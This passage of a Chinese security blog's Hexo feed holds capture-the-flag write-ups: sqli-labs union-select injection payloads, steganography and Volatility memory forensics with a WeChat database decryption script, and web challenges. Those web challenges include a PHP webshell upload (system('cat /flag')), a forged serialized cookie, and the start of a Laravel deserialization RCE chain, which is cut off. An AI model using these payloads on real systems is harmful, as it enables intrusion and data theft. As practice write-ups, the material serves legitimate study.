<span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less 4"></a>Less 4</h2><p>基于错误的 GET <strong>双引号字符型注入</strong></p><h3 id="判断注入类型-3"><a href="#判断注入类型-3" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>依次尝试注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1</span><br><span class="line">?id=1&#x27;</span><br><span class="line">?id=1&quot;</span><br></pre></td></tr></table></figure><p>尝试注入个双引号闭合时，网页回显 MySQL报错，说明存在注入漏洞。</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408071623443.png" alt="image-20240807162300567"></p><p>根据报错信息，可以看到此处还存在括号，因此我们需要使用双引号和括号来闭合，注释掉后面的 SQL 语句后其他操作步骤和 Less 1 相同。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) --+</span><br></pre></td></tr></table></figure><h3 id="获取数据库信息-3"><a href="#获取数据库信息-3" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>判断表有几列，使用order by子句进行一个排序，测试到第 4 列无回显，说明表中一共有 3 列。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3 --+</span><br></pre></td></tr></table></figure><p>爆数据库名，我们选择第 3 个位置作为显示位。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,database() --+</span><br></pre></td></tr></table></figure><p>…除了采用<code>&quot;</code>和<code>)</code>闭合 外，步骤与Less 1完全相同</p><h3 id="获取目标信息-3"><a href="#获取目标信息-3" class="headerlink" title="获取目标信息"></a>获取目标信息</h3><p>同Less 1</p><h3 id="关卡SQL查询语句-3"><a href="#关卡SQL查询语句-3" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      print_r(mysql_error());</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>好想一直躺着</title>
      <link href="/posts/%E9%97%B2%E6%97%B6%E5%B0%8F%E8%AE%B0/"/>
      <url>/posts/%E9%97%B2%E6%97%B6%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="如果没有梦想和目标，那和无忧无虑有什么区别。"><a href="#如果没有梦想和目标，那和无忧无虑有什么区别。" class="headerlink" title="如果没有梦想和目标，那和无忧无虑有什么区别。"></a>如果没有梦想和目标，那和无忧无虑有什么区别。</h2>]]></content>
      
      
      <categories>
          
          <category> 闲记 </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 一些闲记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯-[Misc]迷失环境</title>
      <link href="/posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF-%5BMisc%5D%E8%BF%B7%E5%A4%B1%E7%8E%AF%E5%A2%83/"/>
      <url>/posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF-%5BMisc%5D%E8%BF%B7%E5%A4%B1%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="羊城杯-Misc-迷失环境"><a href="#羊城杯-Misc-迷失环境" class="headerlink" title="羊城杯-[Misc]迷失环境"></a>羊城杯-[Misc]迷失环境</h2><p>打开附件是一个.vmdk文件，这种文件可以用7z解压打开</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302230648.png" alt="image-20220904195617638"></p><p>这里主要看<code>迷失环境</code>和<code>RECYCLE.BIN</code>这两个文件夹<br>在RECYCLE.BIN(回收站)文件夹中可以发现前两个文件比较大</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302230665.png" alt="image-20220904195943892"></p><p>第一个文件用010打开发现缺少PNG文件头</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302230155.png" alt="image-20220930223038099"></p><p>补充后保存，打开是一张和迷失环境文件夹中图片一样的图片</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302230063.png" alt="image-20220930223047881"></p><p>在其中任选一张和刚刚还原的图片在stegsolve中进行图像合并</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302230252.png" alt="image-20220930223059205"></p><p>得到 <code>key is:可莉前来报到</code></p><p>回收站中另一张图片打开是一张可莉，kali中进行outguess隐写解密</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302231479.png" alt="image-20220930223108441"></p><p>成功得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022巅峰极客(Volatility)</title>
      <link href="/posts/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0(volatility)/"/>
      <url>/posts/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0(volatility)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="2022巅峰极客复现"><a href="#2022巅峰极客复现" class="headerlink" title="2022巅峰极客复现"></a>2022巅峰极客复现</h2><h3 id="Misc-easy-Forensic"><a href="#Misc-easy-Forensic" class="headerlink" title="[Misc]easy_Forensic"></a>[Misc]easy_Forensic</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>小明不小心把自己出题的flag在微信中发了出去，你能找到这个flag吗？</p><p>附件下载：<a href="https://pan.baidu.com/share/init?surl=ttL3WmlMn48RDXGCIy6VkQ">https://pan.baidu.com/share/init?surl=ttL3WmlMn48RDXGCIy6VkQ</a> 提取码(GAME)</p><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>下载附件是一个.raw文件，内存取证题</p><p>利用取证工具volatility(一般kali自带volatility，但2022版的kali需要自行安装)</p><h5 id="1、查看镜像系统"><a href="#1、查看镜像系统" class="headerlink" title="1、查看镜像系统"></a>1、查看镜像系统</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f secret.raw imageinfo</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# volatility -f secret.raw imageinfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418</span><br><span class="line">                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/root/桌面/secret.raw)</span><br><span class="line">                      PAE type : No PAE</span><br><span class="line">                           DTB : 0x187000L</span><br><span class="line">                          KDBG : 0xf80003fef070L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 0</span><br><span class="line">                KPCR for CPU 0 : 0xfffff80003ff0d00L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2022-08-13 11:48:11 UTC+0000</span><br><span class="line">     Image local date and time : 2022-08-13 19:48:11 +0800</span><br></pre></td></tr></table></figure><p>支持的系统中有:<code>Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418</code><br>要验证哪个系统正确，可以使用命令依次尝试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#调出shell窗口，如果正确的话便可以getshell</span><br><span class="line">volatility -f 1.raw --profile=Win7SP1x64 volshell</span><br><span class="line">#shell命令：</span><br><span class="line">dt(&quot;内核关键数据结构名称&quot;)</span><br><span class="line">dt(&quot;_PEB&quot;)</span><br></pre></td></tr></table></figure><p>得到正确的镜像系统后，便可以在后面加上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--profile=Win7SP1x64</span><br></pre></td></tr></table></figure><h5 id="2、查看桌面的文件目录"><a href="#2、查看桌面的文件目录" class="headerlink" title="2、查看桌面的文件目录"></a>2、查看桌面的文件目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f secret.raw --profile=Win7SP1x64 filescan |grep &#x27;Desktop&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# volatility -f secret.raw --profile=Win7SP1x64 filescan |grep &#x27;Desktop&#x27;</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">0x000000006c9c6290     16      0 R--rwd \Device\HarddiskVolume1\Users\Admin\Links\Desktop.lnk</span><br><span class="line">0x000000006d526f20      8      0 R--r-d \Device\HarddiskVolume1\Users\Admin\Desktop\MRCv120.exe</span><br><span class="line">0x0000000072e8bf20      2      0 -W-rw- \Device\HarddiskVolume1\Users\Admin\Desktop\EULAaccepted.dat</span><br><span class="line">0x000000007d80a7d0     16      0 R--r-- \Device\HarddiskVolume1\Users\Admin\Desktop\gift.jpg</span><br><span class="line">0x000000007d84af20     15      0 R--rw- \Device\HarddiskVolume1\Users\Admin\Desktop\hint.txt</span><br><span class="line">0x000000007d84e350     14      0 R--rw- \Device\HarddiskVolume1\Users\Admin\Desktop\secret.zip</span><br><span class="line">0x000000007da64360      2      0 R--rwd \Device\HarddiskVolume1\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\Desktop.ini</span><br><span class="line">0x000000007da66c70     16      0 R--rwd \Device\HarddiskVolume1\Users\Public\Desktop\desktop.ini</span><br><span class="line">0x000000007da66dc0      2      0 R--rwd \Device\HarddiskVolume1\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Desktop.ini</span><br><span class="line">0x000000007da68070      2      0 R--rwd \Device\HarddiskVolume1\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Desktop.ini</span><br><span class="line">0x000000007da68c00      2      0 R--rwd \Device\HarddiskVolume1\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Desktop.ini</span><br><span class="line">0x000000007da6af20      2      0 R--rwd \Device\HarddiskVolume1\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Desktop.ini</span><br><span class="line">0x000000007da6dab0      2      0 R--rwd \Device\HarddiskVolume1\ProgramData\Microsoft\Windows\Start Menu\Programs\Maintenance\Desktop.ini</span><br><span class="line">0x000000007da6fab0      2      0 R--rwd \Device\HarddiskVolume1\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Desktop.ini</span><br><span class="line">0x000000007da6fc00      2      0 R--rwd \Device\HarddiskVolume1\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Desktop.ini</span><br><span class="line">0x000000007da704a0      2      0 R--rwd \Device\HarddiskVolume1\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\Tablet PC\Desktop.ini</span><br><span class="line">0x000000007da7f310      2      1 R--rwd \Device\HarddiskVolume1\Users\Admin\Desktop</span><br><span class="line">0x000000007da7f4e0      2      1 R--rwd \Device\HarddiskVolume1\Users\Admin\Desktop</span><br><span class="line">0x000000007da80740     16      0 R--rw- \Device\HarddiskVolume1\Users\Public\Desktop\Glary Tracks Eraser.lnk</span><br><span class="line">0x000000007da81670      2      1 R--rwd \Device\HarddiskVolume1\Users\Public\Desktop</span><br><span class="line">0x000000007da81b70      2      1 R--rwd \Device\HarddiskVolume1\Users\Public\Desktop</span><br><span class="line">0x000000007dae0420     10      0 R--rw- \Device\HarddiskVolume1\Users\Admin\Desktop\wechat.txt</span><br><span class="line">0x000000007dc47bc0      2      0 R--rwd \Device\HarddiskVolume1\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\Remote Desktop Connection.lnk</span><br><span class="line">0x000000007de7c070     11      0 R--r-d \Device\HarddiskVolume1\Users\Admin\Desktop\MRCv120.exe</span><br><span class="line">0x000000007dfa9150      9      0 R--r-d \Device\HarddiskVolume1\Users\Admin\Desktop\MRCC206.tmp</span><br><span class="line">0x000000007e144d20     16      0 R--rwd \Device\HarddiskVolume1\Users\Admin\Desktop\desktop.ini</span><br><span class="line">0x000000007e614420      1      1 R--rw- \Device\HarddiskVolume1\Users\Admin\Desktop</span><br><span class="line">0x000000007ee47230     16      0 R--rw- \Device\HarddiskVolume1\Users\Public\Desktop\Firefox.lnk</span><br><span class="line">0x000000007f1e6ad0      1      1 -W-r-- \Device\HarddiskVolume1\Users\Admin\Desktop\111.raw</span><br></pre></td></tr></table></figure><p>发现其中几个比较显眼的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000007d80a7d0     16      0 R--r-- \Device\HarddiskVolume1\Users\Admin\Desktop\gift.jpg</span><br><span class="line">0x000000007d84af20     15      0 R--rw- \Device\HarddiskVolume1\Users\Admin\Desktop\hint.txt</span><br><span class="line">0x000000007d84e350     14      0 R--rw- \Device\HarddiskVolume1\Users\Admin\Desktop\secret.zip</span><br><span class="line">0x000000007dae0420     10      0 R--rw- \Device\HarddiskVolume1\Users\Admin\Desktop\wechat.txt</span><br></pre></td></tr></table></figure><p>注：查看记事本隐藏消息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f secret.raw --profile=Win7SP1x86 editbox</span><br></pre></td></tr></table></figure><p>查看剪贴板消息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f secret.raw --profile=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure><p>提取进程memdump</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f secret.raw --profile=Win7SP1x64 memdump -p xxx --dump-dir=./</span><br><span class="line">memdump：提取出指定进程，常用foremost 来分离里面的文件 </span><br></pre></td></tr></table></figure><p>查看cmd命令行消息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f secret.raw --profile=Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure><h5 id="3、提取所需文件-其中hint-txt无法提取"><a href="#3、提取所需文件-其中hint-txt无法提取" class="headerlink" title="3、提取所需文件(其中hint.txt无法提取)"></a>3、提取所需文件(其中hint.txt无法提取)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volatility -f secret.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007d80a7d0 --dump-dir=./</span><br><span class="line">注：</span><br><span class="line">-Q的参数为内存地址</span><br><span class="line">--dump-dir的参数为导出文件的目录</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# volatility -f secret.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007d80a7d0 --dump-dir=./</span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">DataSectionObject 0x7d80a7d0   None   \Device\HarddiskVolume1\Users\Admin\Desktop\gift.jpg</span><br></pre></td></tr></table></figure><p>输入命令后回车即可，提取出的文件会保存在桌面，共提取三个文件：gift.jpg、secret.zip、wechat.txt</p><h5 id="4、修改jpg图片高度"><a href="#4、修改jpg图片高度" class="headerlink" title="4、修改jpg图片高度"></a>4、修改jpg图片高度</h5><p>gift.jpg图片需要修改高度，用010editor打开图片搜索：<code>FF C0 00 11 08</code></p><p>jpg图片的高度需修改<code>FF C0 00 11 08</code>字节的后两位</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302232322.png" alt="image-20220819105123467"></p><p>再次打开图片得到密码</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302232894.png" alt="image-20220930223253846"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Passwd:Nothing is more important than your life!</span><br><span class="line">需修改成:Nothing_is_more_important_than_your_life!(服了)</span><br></pre></td></tr></table></figure><h5 id="5、获取秘钥"><a href="#5、获取秘钥" class="headerlink" title="5、获取秘钥"></a>5、获取秘钥</h5><p>用修改后的密码打开secret.zip中的加密文件</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302233047.png" alt="image-20220819105712218"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A gift for You:  wHeMscYvTluyRvjf5d7AEX5K4VlZeU2IiGpKLFzek1Q=</span><br></pre></td></tr></table></figure><p>加密的秘钥，直接base64是解不了的<br>因为AES 的密钥是binary，base64 和 Hex 都只是一种 printable 形式，所以在CyberChef中<code>From Base64 + To Hex</code>运行得到秘钥:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c0778cb1c62f4e5bb246f8dfe5dec0117e4ae15959794d88886a4a2c5cde9354</span><br></pre></td></tr></table></figure><p>密文则是提取出来的wechat.txt，由于微信的数据库采用SQLite加密，根据我们已经获得的密钥，可以尝试使用openssl解密。</p><h5 id="6、解密脚本"><a href="#6、解密脚本" class="headerlink" title="6、解密脚本"></a>6、解密脚本</h5><p>解密部分参考大佬的博客：<a href="https://blog.7herightp4th.top/index.php/archives/22/">https://blog.7herightp4th.top/index.php/archives/22/</a></p><p>里面有完整的pc微信数据库的解密脚本，换一下路径和password即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib, hmac, ctypes</span><br><span class="line"></span><br><span class="line">SQLITE_FILE_HEADER = <span class="built_in">bytes</span>(<span class="string">&quot;SQLite format 3&quot;</span>,encoding=<span class="string">&#x27;ASCII&#x27;</span>) + <span class="built_in">bytes</span>(<span class="number">1</span>)<span class="comment">#文件头</span></span><br><span class="line">IV_SIZE = <span class="number">16</span></span><br><span class="line">HMAC_SHA1_SIZE = <span class="number">20</span></span><br><span class="line">KEY_SIZE = <span class="number">32</span></span><br><span class="line">DEFAULT_PAGESIZE = <span class="number">4096</span> <span class="comment">#4048数据 + 16IV + 20 HMAC + 12</span></span><br><span class="line">DEFAULT_ITER = <span class="number">64000</span></span><br><span class="line"><span class="comment">#yourkey</span></span><br><span class="line">password = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;c0778cb1c62f4e5bb246f8dfe5dec0117e4ae15959794d88886a4a2c5cde9354&quot;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;C:\Users\lenovo\Desktop\wechat&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    blist = f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(blist))</span><br><span class="line"></span><br><span class="line">salt = blist[:<span class="number">16</span>]<span class="comment">#微信将文件头换成了盐</span></span><br><span class="line">key = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, password, salt, DEFAULT_ITER, KEY_SIZE)<span class="comment">#获得Key</span></span><br><span class="line"></span><br><span class="line">first = blist[<span class="number">16</span>:DEFAULT_PAGESIZE]<span class="comment">#丢掉salt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import struct</span></span><br><span class="line">mac_salt = <span class="built_in">bytes</span>([x^<span class="number">0x3a</span> <span class="keyword">for</span> x <span class="keyword">in</span> salt])</span><br><span class="line">mac_key = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, key, mac_salt, <span class="number">2</span>, KEY_SIZE)</span><br><span class="line"></span><br><span class="line">hash_mac = hmac.new(mac_key ,digestmod = <span class="string">&#x27;sha1&#x27;</span>)<span class="comment">#用第一页的Hash测试一下</span></span><br><span class="line">hash_mac.update(first[:-<span class="number">32</span>])</span><br><span class="line">hash_mac.update(<span class="built_in">bytes</span>(ctypes.c_int(<span class="number">1</span>)))</span><br><span class="line"><span class="comment"># hash_mac.update(struct.pack(&#x27;=I&#x27;,1))</span></span><br><span class="line"><span class="keyword">if</span> (hash_mac.digest() == first[-<span class="number">32</span>:-<span class="number">12</span>]):</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&#x27;Correct Password&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"> <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Wrong Password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">blist = [blist[i:i+DEFAULT_PAGESIZE] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(DEFAULT_PAGESIZE,<span class="built_in">len</span>(blist),DEFAULT_PAGESIZE)]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;C:\Users\lenovo\Desktop\flag.db&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(SQLITE_FILE_HEADER)<span class="comment">#写入文件头</span></span><br><span class="line">    t = AES.new(key ,AES.MODE_CBC ,first[-<span class="number">48</span>:-<span class="number">32</span>])</span><br><span class="line">    f.write(t.decrypt(first[:-<span class="number">48</span>]))</span><br><span class="line">    f.write(first[-<span class="number">48</span>:])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blist:</span><br><span class="line">            t = AES.new(key ,AES.MODE_CBC ,i[-<span class="number">48</span>:-<span class="number">32</span>])</span><br><span class="line">            f.write(t.decrypt(i[:-<span class="number">48</span>]))</span><br><span class="line">            f.write(i[-<span class="number">48</span>:])</span><br></pre></td></tr></table></figure><p>运行后得到flag.db文件，可以用记事本方式打开搜索flag即可。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022强网杯复现</title>
      <link href="/posts/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
      <url>/posts/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>##2022强网杯复现</p><h3 id="强网杯-强网先锋-rcefile"><a href="#强网杯-强网先锋-rcefile" class="headerlink" title="强网杯-强网先锋 rcefile"></a>强网杯-强网先锋 rcefile</h3><p>学一点是一点，又是努力尝试不做fw的一天……</p><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><p>文件泄露、spl_autoload_register的可能性利用、文件上传、文件包含、反序列化</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>扫描目录存在<a href="http://www.zip,存在源码泄露,访问/www.zip%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81">www.zip,存在源码泄露，访问/www.zip下载源码</a><br>查看源码中config.inc.php,发现对cookie做了反序列化,并存在spl_autoload_register()函数</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302235648.png" alt="image-20220930223510597"></p><p>关于spl_autoload_register函数</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302235053.png" alt="image-20220930223522995"></p><p>cookie的userfile就是上传文件加密过的文件名来构造序列化</p><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>上传jpg⽂件，bp抓包，把jpg后缀改成.inc，<br>上传文件内容为 <?php system("cat /flag ");?><br>然后发送，可以得到⽂件名为 axxxxxxxxxxxxxxxxxxxxxxxx.inc<br>注意：生成的文件名需要字母开头(是bp里面得到的文件名)<br>然后对文件名进行序列化，其中的axxxxxxx是文件名<br>&lt;?php<br>class axxxxxxxxxxxxxxxxxxxxxxxx{<br>function __construct()<br>{<br>}<br>}<br>$p = new axxxxxxxxxxxxxxxxxxxxxxxx();<br>echo serialize($p);<br>在线运行得到序列化结果<br>然后访问<a href="http://ip:port/showfile.php，将cookie改为序列化结果然后发送即可得到flag">http://ip:port/showfile.php，将cookie改为序列化结果然后发送即可得到flag</a></p><h2 id="NEPCTF-Web-Just-Kidding"><a href="#NEPCTF-Web-Just-Kidding" class="headerlink" title="NEPCTF-Web Just Kidding"></a>NEPCTF-Web Just Kidding</h2><h4 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h4><p>文件泄露、Laravel9.1.8远程执行漏洞、反序列化</p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>扫目录发现存在/<a href="http://www.zip,访问然后下载源码进行代码审计(太菜了很多看不懂)/">www.zip，访问然后下载源码进行代码审计(太菜了很多看不懂)</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//App\Http\Controllers\HelloController.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params">\Illuminate\Http\Request <span class="variable">$request</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$h3</span> = base64_decode(<span class="variable">$request</span>-&gt;input(<span class="string">&quot;h3&quot;</span>));</span><br><span class="line">        unserialize(<span class="variable">$h3</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome Nepctf! GL&amp;HF&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 php 文件中有一个反序列化的函数存在反序列化漏洞，看大佬的wp说可以使用Laravel9.1.8远程执行漏洞</p><h4 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h4><p>构建poc链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//exp:</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Queue</span>&#123;</span><br><span class="line">    <span class="title">interface</span> <span class="title">ShouldQueue</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">container</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pipeline</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pipes</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handlers</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$queueResolver</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span 